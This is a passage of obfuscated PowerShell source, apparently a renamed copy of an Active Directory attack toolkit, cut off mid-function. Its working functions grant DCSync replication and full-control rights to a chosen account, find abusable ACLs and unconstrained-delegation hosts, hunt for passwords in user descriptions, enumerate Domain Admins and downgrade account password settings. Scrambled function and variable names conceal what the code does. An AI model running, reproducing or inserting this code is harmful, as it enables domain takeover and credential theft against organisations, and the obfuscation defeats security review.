        $vmKAjeiLpGRmxne = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $eorBTXSenoDqict -UirdwsEp9cfwlHj $gVBAxxX9tPfwbwm -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK

        if(!$dO9XoaRTPR99dpJ) {
            $nptISrxIFvJkrEO = bicycled -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -Name $yZ99uAMPn9ZX99M -KEeslQlCMbRmZZC $qzWShJBLoZTtCF9 -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
            
            if(!$nptISrxIFvJkrEO) {
                throw "Error resolving principal"
            }
            $dO9XoaRTPR99dpJ = $nptISrxIFvJkrEO.objectsid
        }
        if(!$dO9XoaRTPR99dpJ) {
            throw "Error resolving principal"
        }
    }

    process {

        if ($vmKAjeiLpGRmxne) {

            if($P9zADqxpBvcLNxH) {
                $vmKAjeiLpGRmxne.filter="(&(samaccountname=$P9zADqxpBvcLNxH)(name=$eUVmPtzrlOpHgRH)(distinguishedname=$FvbROQyrgvOdaq9)$EnoJxjgcGVj9wxG)"  
            }
            else {
                $vmKAjeiLpGRmxne.filter="(&(name=$eUVmPtzrlOpHgRH)(distinguishedname=$FvbROQyrgvOdaq9)$EnoJxjgcGVj9wxG)"  
            }
  
            try {
                $vmKAjeiLpGRmxne.FindAll() | Where-Object {$_} | Foreach-Object {


                    $aailGIeHyNRJtoO = $_.Properties.distinguishedname

                    $njyqYULI9vuNiz9 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$dO9XoaRTPR99dpJ)
                    $BirGbMpSA9xDshK = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
                    $pFevbWVrNQHKyDb = [System.Security.AccessControl.AccessControlType] "Allow"
                    $ACEs = @()

                    if($DJtEHjOqQsdkg9m) {
                        $GUIDs = @($DJtEHjOqQsdkg9m)
                    }
                    else {
                        $GUIDs = Switch ($hnaAakdgBnpXILi) {

                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }

                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }




                            "DCSync" { "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", "89e95b76-444d-4c62-991a-0facbeda640c"}
                        }
                    }

                    if($GUIDs) {
                        foreach($GUID in $GUIDs) {
                            $g9nyKW9ioulE9Rf = New-Object Guid $GUID
                            $P9wdWPV99veJNxT = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $njyqYULI9vuNiz9,$P9wdWPV99veJNxT,$pFevbWVrNQHKyDb,$g9nyKW9ioulE9Rf,$BirGbMpSA9xDshK
                        }
                    }
                    else {

                        $P9wdWPV99veJNxT = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $njyqYULI9vuNiz9,$P9wdWPV99veJNxT,$pFevbWVrNQHKyDb,$BirGbMpSA9xDshK
                    }

                    Write-Verbose "Granting principal $dO9XoaRTPR99dpJ '$hnaAakdgBnpXILi' on $($_.Properties.distinguishedname)"

                    try {

                        ForEach ($ACE in $ACEs) {
                            Write-Verbose "Granting principal $dO9XoaRTPR99dpJ '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)"
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)
                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning "Error granting principal $dO9XoaRTPR99dpJ '$hnaAakdgBnpXILi' on $aailGIeHyNRJtoO : $_"
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function Epictetus {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $KEeslQlCMbRmZZC,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $gLCImVp9wWzIBxH = "*",

        [String]
        $DshCfudiWKUrQer,

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $UirdwsEp9cfwlHj,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $9zUYEEdPnpgazQB,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )


    Get-ObjectACL @PSBoundParameters | ForEach-Object {

        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | Where-Object {

        try {
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | Where-Object {

        ($_.ActiveDirectoryRights -eq "GenericAll") -or ($_.ActiveDirectoryRights -match "Write") -or ($_.ActiveDirectoryRights -match "Create") -or ($_.ActiveDirectoryRights -match "Delete") -or (($_.ActiveDirectoryRights -match "ExtendedRight") -and ($_.AccessControlType -eq "Allow"))
    }
}


function Vonnegut {


    [CmdletBinding()]
    Param (
        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $9FKtKCtCIneLDJy = (televisions).schema.name

    $DmdxNmJsESFqKT9 = synonym -GazxKCLDhxrDzgZ $9FKtKCtCIneLDJy -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    if($DmdxNmJsESFqKT9) {
        $DmdxNmJsESFqKT9.filter = "(schemaIDGUID=*)"
        try {
            $DmdxNmJsESFqKT9.FindAll() | Where-Object {$_} | ForEach-Object {

                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }      
    }

    $EXeky9wZ99RCQXP = synonym -GazxKCLDhxrDzgZ $9FKtKCtCIneLDJy.replace("Schema","Extended-Rights") -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    if ($EXeky9wZ99RCQXP) {
        $EXeky9wZ99RCQXP.filter = "(objectClass=controlAccessRight)"
        try {
            $EXeky9wZ99RCQXP.FindAll() | Where-Object {$_} | ForEach-Object {

                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function Randal {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = '*',

        [String]
        $SPN,

        [String]
        $lVRTtGIBisoAexC,

        [String]
        $jIyTIqaDLQPt9yn,

        [String]
        $DshCfudiWKUrQer,

        [Switch]
        $jvNuzrpmXcIdLxi,

        [Switch]
        $Ping,

        [Switch]
        $wD9BSmPbiJRFWDu,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [Switch]
        $tXJXRLTbTAiviMb,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {

        $GIBTNKzmNpKkMrd = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }

    process {

        if ($GIBTNKzmNpKkMrd) {


            if($tXJXRLTbTAiviMb) {
                Write-Verbose "Searching for computers with for unconstrained delegation"
                $DshCfudiWKUrQer += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }

            if($jvNuzrpmXcIdLxi) {
                Write-Verbose "Searching for printers"

                $DshCfudiWKUrQer += "(objectCategory=printQueue)"
            }
            if($SPN) {
                Write-Verbose "Searching for computers with SPN: $SPN"
                $DshCfudiWKUrQer += "(servicePrincipalName=$SPN)"
            }
            if($lVRTtGIBisoAexC) {
                $DshCfudiWKUrQer += "(operatingsystem=$lVRTtGIBisoAexC)"
            }
            if($jIyTIqaDLQPt9yn) {
                $DshCfudiWKUrQer += "(operatingsystemservicepack=$jIyTIqaDLQPt9yn)"
            }

            $GIBTNKzmNpKkMrd.filter = "(&(sAMAccountType=805306369)(dnshostname=$kEneZcxTTiuFrPZ)$DshCfudiWKUrQer)"

            try {

                $GIBTNKzmNpKkMrd.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Up = $True
                    if($Ping) {

                        $Up = Test-Connection -Count 1 -Quiet -kEneZcxTTiuFrPZ $_.properties.dnshostname
                    }
                    if($Up) {

                        if ($wD9BSmPbiJRFWDu) {

                            educates -QQDWOvojOeRaVdg $_.Properties
                        }
                        else {

                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function bicycled {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $KEeslQlCMbRmZZC,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $DshCfudiWKUrQer,

        [Switch]
        $sYHexDqqVyhGUer,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )
    process {
        if($SID) {

            try {
                $Name = die $SID
                if($Name) {
                    $9k9EaEf9UldsuCa = Seeger -OADAUGURRbgtTDp $Name
                    if($9k9EaEf9UldsuCa) {
                        $KKbtTlEQY9KtTfJ = $9k9EaEf9UldsuCa.split("/")[0]
                    }
                    else {
                        Write-Warning "Error resolving SID '$SID'"
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning "Error resolving SID '$SID' : $_"
                return $Null
            }
        }

        $UodKbe9raLmrqGL = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK

        if($UodKbe9raLmrqGL) {

            if($SID) {
                $UodKbe9raLmrqGL.filter = "(&(objectsid=$SID)$DshCfudiWKUrQer)"
            }
            elseif($Name) {
                $UodKbe9raLmrqGL.filter = "(&(name=$Name)$DshCfudiWKUrQer)"
            }
            elseif($KEeslQlCMbRmZZC) {
                $UodKbe9raLmrqGL.filter = "(&(samAccountName=$KEeslQlCMbRmZZC)$DshCfudiWKUrQer)"
            }

            $UodKbe9raLmrqGL.FindAll() | Where-Object {$_} | ForEach-Object {
                if($sYHexDqqVyhGUer) {
                    $_
                }
                else {

                    educates -QQDWOvojOeRaVdg $_.Properties
                }
            }
        }
    }
}


function numeral {


    [CmdletBinding()]
    Param (
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $KEeslQlCMbRmZZC,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $DshCfudiWKUrQer,

        [Parameter(Mandatory = $True)]
        [String]
        $iHWDtsdmYLrFDrT,

        $M9lLAHcfjwGeoze,

        [Int]
        $KREIhtoOGDTSBUa,

        [Switch]
        $ajebISDSF9rSPgq,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    $ASTrTpJJOLHCvQs = @{
        'SID' = $SID
        'Name' = $Name
        'SamAccountName' = $KEeslQlCMbRmZZC
        'Domain' = $KKbtTlEQY9KtTfJ
        'DomainController' = $ewHsaEFeoXOCPPv
        'Filter' = $DshCfudiWKUrQer
        'PageSize' = $WRYKTaHSEUSKduK
    }

    $EkkJZPuScMwF9bw = bicycled -sYHexDqqVyhGUer @Arguments
    
    try {

        $Entry = $EkkJZPuScMwF9bw.GetDirectoryEntry()
        
        if($ajebISDSF9rSPgq) {
            Write-Verbose "Clearing value"
            $Entry.$iHWDtsdmYLrFDrT.clear()
            $Entry.commitchanges()
        }

        elseif($KREIhtoOGDTSBUa) {
            $dvD99AGGkGPQxSf = $Entry.$iHWDtsdmYLrFDrT[0].GetType().name


            $M9lLAHcfjwGeoze = $($Entry.$iHWDtsdmYLrFDrT) -bxor $KREIhtoOGDTSBUa 
            $Entry.$iHWDtsdmYLrFDrT = $M9lLAHcfjwGeoze -as $dvD99AGGkGPQxSf       
            $Entry.commitchanges()     
        }

        else {
            $Entry.put($iHWDtsdmYLrFDrT, $M9lLAHcfjwGeoze)
            $Entry.setinfo()
        }
    }
    catch {
        Write-Warning "Error setting property $iHWDtsdmYLrFDrT to value '$M9lLAHcfjwGeoze' for object $($EkkJZPuScMwF9bw.Properties.samaccountname) : $_"
    }
}


function stepchild {


    [CmdletBinding()]
    Param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $KEeslQlCMbRmZZC,

        [String]
        $Name,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $DshCfudiWKUrQer,

        [Switch]
        $WQZWrqgXyXwg9Go
    )

    process {
        $ASTrTpJJOLHCvQs = @{
            'SamAccountName' = $KEeslQlCMbRmZZC
            'Name' = $Name
            'Domain' = $KKbtTlEQY9KtTfJ
            'DomainController' = $ewHsaEFeoXOCPPv
            'Filter' = $DshCfudiWKUrQer
        }


        $fcGeJWWzPzidKCk = bicycled @Arguments | select useraccountcontrol | heeling

        if($WQZWrqgXyXwg9Go) {

            if($fcGeJWWzPzidKCk.Keys -contains "ENCRYPTED_TEXT_PWD_ALLOWED") {

                numeral @Arguments -iHWDtsdmYLrFDrT useraccountcontrol -KREIhtoOGDTSBUa 128
            }


            numeral @Arguments -iHWDtsdmYLrFDrT pwdlastset -M9lLAHcfjwGeoze -1
        }

        else {

            if($fcGeJWWzPzidKCk.Keys -contains "DONT_EXPIRE_PASSWORD") {

                numeral @Arguments -iHWDtsdmYLrFDrT useraccountcontrol -KREIhtoOGDTSBUa 65536
            }

            if($fcGeJWWzPzidKCk.Keys -notcontains "ENCRYPTED_TEXT_PWD_ALLOWED") {

                numeral @Arguments -iHWDtsdmYLrFDrT useraccountcontrol -KREIhtoOGDTSBUa 128
            }


            numeral @Arguments -iHWDtsdmYLrFDrT pwdlastset -M9lLAHcfjwGeoze 0
        }
    }
}


function Spencer {


    [CmdletBinding()]
    param(
        [String[]]
        $QQDWOvojOeRaVdg,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    if($QQDWOvojOeRaVdg) {

        $QQDWOvojOeRaVdg = ,"name" + $QQDWOvojOeRaVdg | Sort-Object -Unique
        Randal -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Select-Object -Property $QQDWOvojOeRaVdg
    }
    else {

        Randal -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function papas {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $YpxVXRyDDUvIVnp = 'pass',

        [Alias('Field')]
        [String]
        $yZREVtj9QbvrBGd = 'description',

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    process {
        Randal -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -wD9BSmPbiJRFWDu -DshCfudiWKUrQer "($yZREVtj9QbvrBGd=*$YpxVXRyDDUvIVnp*)" -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Select-Object samaccountname,$yZREVtj9QbvrBGd
    }
}


function damsels {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $VRGbNLtUx9yJcd9 = '*',

        [String]
        $GUID,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [Switch]
        $wD9BSmPbiJRFWDu,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {
        $pYIGUGMCYhhxKKJ = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }
    process {
        if ($pYIGUGMCYhhxKKJ) {
            if ($GUID) {

                $pYIGUGMCYhhxKKJ.filter="(&(objectCategory=organizationalUnit)(name=$VRGbNLtUx9yJcd9)(gplink=*$GUID*))"
            }
            else {
                $pYIGUGMCYhhxKKJ.filter="(&(objectCategory=organizationalUnit)(name=$VRGbNLtUx9yJcd9))"
            }

            $pYIGUGMCYhhxKKJ.FindAll() | Where-Object {$_} | ForEach-Object {
                if ($wD9BSmPbiJRFWDu) {

                    educates -QQDWOvojOeRaVdg $_.Properties
                }
                else { 

                    $_.properties.adspath
                }
            }
        }
    }
}


function xylophone {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $IIH9PBTZulqSUhp = "*",

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $GUID,

        [Switch]
        $wD9BSmPbiJRFWDu,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {
        $LLcDA9OfvKhbdEo = synonym -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -UirdwsEp9cfwlHj "CN=Sites,CN=Configuration" -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }
    process {
        if($LLcDA9OfvKhbdEo) {

            if ($GUID) {

                $LLcDA9OfvKhbdEo.filter="(&(objectCategory=site)(name=$IIH9PBTZulqSUhp)(gplink=*$GUID*))"
            }
            else {
                $LLcDA9OfvKhbdEo.filter="(&(objectCategory=site)(name=$IIH9PBTZulqSUhp))"
            }
            
            try {
                $LLcDA9OfvKhbdEo.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($wD9BSmPbiJRFWDu) {

                        educates -QQDWOvojOeRaVdg $_.Properties
                    }
                    else {

                        $_.properties.name
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function ignominies {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $IIH9PBTZulqSUhp = "*",

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $wD9BSmPbiJRFWDu,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {
        $pzlZXD9RDZimCTb = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -UirdwsEp9cfwlHj "CN=Subnets,CN=Sites,CN=Configuration" -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }

    process {
        if($pzlZXD9RDZimCTb) {

            $pzlZXD9RDZimCTb.filter="(&(objectCategory=subnet))"

            try {
                $pzlZXD9RDZimCTb.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($wD9BSmPbiJRFWDu) {

                        educates -QQDWOvojOeRaVdg $_.Properties | Where-Object { $_.siteobject -match "CN=$IIH9PBTZulqSUhp" }
                    }
                    else {

                        if ( ($IIH9PBTZulqSUhp -and ($_.properties.siteobject -match "CN=$IIH9PBTZulqSUhp,")) -or ($IIH9PBTZulqSUhp -eq '*')) {

                            $wJiEcIBTctPU9GY = @{
                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                $wJiEcIBTctPU9GY['Site'] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                $wJiEcIBTctPU9GY['Site'] = 'Error'
                            }

                            New-Object -TypeName PSObject -Property $wJiEcIBTctPU9GY                 
                        }
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function drawer {


    param(
        [String]
        $KKbtTlEQY9KtTfJ
    )

    $xJgvwcdGvZSwwyk = skulked -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ
    
    if($xJgvwcdGvZSwwyk) {

        $hoJUOVzkcPlbksX = $xJgvwcdGvZSwwyk.PdcRoleOwner
        $W9crUgiFG9PzdOs = (Randal -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -kEneZcxTTiuFrPZ $hoJUOVzkcPlbksX -wD9BSmPbiJRFWDu).objectsid
        $Parts = $W9crUgiFG9PzdOs.split("-")
        $Parts[0..($Parts.length -2)] -join "-"
    }
}


function reapportioned {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $hIqWczrXxNjFAmP = '*',

        [String]
        $SID,

        [String]
        $IuM9ojehadqRMJF,

        [String]
        $DshCfudiWKUrQer,

        [String]
        $KKbtTlEQY9KtTfJ,
        
        [String]
        $ewHsaEFeoXOCPPv,
        
        [String]
        $GazxKCLDhxrDzgZ,

        [Switch]
        $IWQGvaMfQCkbauo,

        [Switch]
        $wD9BSmPbiJRFWDu,

        [Switch]
        $o9ogSiZcEWqV9BA,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {
        $MFIs9ZmGrJp9bYP = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }

    process {
        if($MFIs9ZmGrJp9bYP) {

            if($IWQGvaMfQCkbauo) {
                Write-Verbose "Checking for adminCount=1"
                $DshCfudiWKUrQer += "(admincount=1)"
            }

            if ($IuM9ojehadqRMJF) {

                $User = bicycled -KEeslQlCMbRmZZC $IuM9ojehadqRMJF -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -sYHexDqqVyhGUer -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK


                $ezBNnTlfCZYU9uu = $User.GetDirectoryEntry()


                $ezBNnTlfCZYU9uu.RefreshCache("tokenGroups")

                $ezBNnTlfCZYU9uu.TokenGroups | Foreach-Object {

                    $FzXbWkbhyBLRNeh = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    

                    if(!($FzXbWkbhyBLRNeh -match '^S-1-5-32-545|-513$')) {
                        if($wD9BSmPbiJRFWDu) {
                            bicycled -SID $FzXbWkbhyBLRNeh -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
                        }
                        else {
                            if($o9ogSiZcEWqV9BA) {
                                $FzXbWkbhyBLRNeh
                            }
                            else {
                                die $FzXbWkbhyBLRNeh
                            }
                        }
                    }
                }
            }
            else {
                if ($SID) {
                    $MFIs9ZmGrJp9bYP.filter = "(&(objectCategory=group)(objectSID=$SID)$DshCfudiWKUrQer)"
                }
                else {
                    $MFIs9ZmGrJp9bYP.filter = "(&(objectCategory=group)(name=$hIqWczrXxNjFAmP)$DshCfudiWKUrQer)"
                }
            
                $MFIs9ZmGrJp9bYP.FindAll() | Where-Object {$_} | ForEach-Object {

                    if ($wD9BSmPbiJRFWDu) {

                        educates -QQDWOvojOeRaVdg $_.Properties
                    }
                    else {

                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}


function confessedly {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $hIqWczrXxNjFAmP,

        [String]
        $SID,

        [String]
        $KKbtTlEQY9KtTfJ = (skulked).Name,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [Switch]
        $wD9BSmPbiJRFWDu,

        [Switch]
        $Okpdr9DpyZPCXBG,

        [Switch]
        $nwlVcuNJ9vIvFpP,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {

        $MFIs9ZmGrJp9bYP = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK

        if(!$ewHsaEFeoXOCPPv) {
            $ewHsaEFeoXOCPPv = ((skulked).PdcRoleOwner).Name
        }
    }

    process {

        if ($MFIs9ZmGrJp9bYP) {

            if ($Okpdr9DpyZPCXBG -and $nwlVcuNJ9vIvFpP) {

                if ($hIqWczrXxNjFAmP) {
                    $Group = reapportioned -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
                }
                elseif ($SID) {
                    $Group = reapportioned -SID $SID -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
                }
                else {

                    $SID = (drawer -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ) + "-512"
                    $Group = reapportioned -SID $SID -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
                }
                $ugp9CU9TTFQY9wF = $Group.distinguishedname
                $IMcPFmHY9nRwLzr = $Group.name

                if ($ugp9CU9TTFQY9wF) {
                    $MFIs9ZmGrJp9bYP.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$ugp9CU9TTFQY9wF)$DshCfudiWKUrQer)"
                    $MFIs9ZmGrJp9bYP.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))

                    $hyl9sdZlHEVp9Fr = $MFIs9ZmGrJp9bYP.FindAll()
                    $IMcPFmHY9nRwLzr = $hIqWczrXxNjFAmP
                }
                else {
                    Write-Error "Unable to find Group"
                }
            }
            else {
                if ($hIqWczrXxNjFAmP) {
                    $MFIs9ZmGrJp9bYP.filter = "(&(objectCategory=group)(name=$hIqWczrXxNjFAmP)$DshCfudiWKUrQer)"
                }
                elseif ($SID) {
                    $MFIs9ZmGrJp9bYP.filter = "(&(objectCategory=group)(objectSID=$SID)$DshCfudiWKUrQer)"
                }
                else {

                    $SID = (drawer -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ) + "-512"
                    $MFIs9ZmGrJp9bYP.filter = "(&(objectCategory=group)(objectSID=$SID)$DshCfudiWKUrQer)"
                }

                $MFIs9ZmGrJp9bYP.FindAll() | ForEach-Object {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }

                        $IMcPFmHY9nRwLzr = $_.properties.name[0]
                        $hyl9sdZlHEVp9Fr = @()

                        if ($_.properties.member.Count -eq 0) {
                            $Hvxw9p9JhdtaGz9 = $False
                            $uKwweHlBhjP9vtZ = 0
                            $Top = 0
                            while(!$Hvxw9p9JhdtaGz9) {
                                $Top = $uKwweHlBhjP9vtZ + 1499
                                $CfizbZCwQy9skwT="member;range=$uKwweHlBhjP9vtZ-$Top"
                                $uKwweHlBhjP9vtZ += 1500
                                $MFIs9ZmGrJp9bYP.PropertiesToLoad.Clear()
                                [void]$MFIs9ZmGrJp9bYP.PropertiesToLoad.Add("$CfizbZCwQy9skwT")
                                try {
                                    $txcsRvewcVdZtUk = $MFIs9ZmGrJp9bYP.FindOne()
                                    if ($txcsRvewcVdZtUk) {
                                        $9xH9CnYMtG9dAep = $_.Properties.PropertyNames -like "member;range=*"
                                        $ZMfjGz9FzIKcj9l = $_.Properties.item($9xH9CnYMtG9dAep)
                                        if ($ZMfjGz9FzIKcj9l.count -eq 0) {
                                            $Hvxw9p9JhdtaGz9 = $True
                                        }
                                        else {
                                            $ZMfjGz9FzIKcj9l | ForEach-Object {
                                                $hyl9sdZlHEVp9Fr += $_
                                            }
                                        }
